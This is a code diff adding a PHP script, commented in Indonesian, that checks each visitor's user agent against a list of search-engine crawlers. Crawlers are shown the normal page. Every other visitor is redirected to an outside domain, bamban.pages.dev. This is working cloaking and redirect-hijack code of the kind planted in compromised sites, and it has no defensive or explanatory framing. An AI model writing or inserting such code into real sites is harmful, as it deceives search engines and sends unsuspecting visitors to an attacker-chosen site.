@@ -1,0 +1,25 @@
+<?php
+
+function isBot() {
+    $bots = [
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou',
+        'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification',
+        'Google-InspectionTool', 'AhrefsBot'
+    ];
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    foreach ($bots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Jika bukan bot, redirect
+if (!isBot()) {
+    header("Location: https://bamban.pages.dev/");
+    exit();
+}
+
+// Jika bot, biarkan lanjut ke isi halaman normal (misalnya HTML statis, artikel, dsb)
+?>
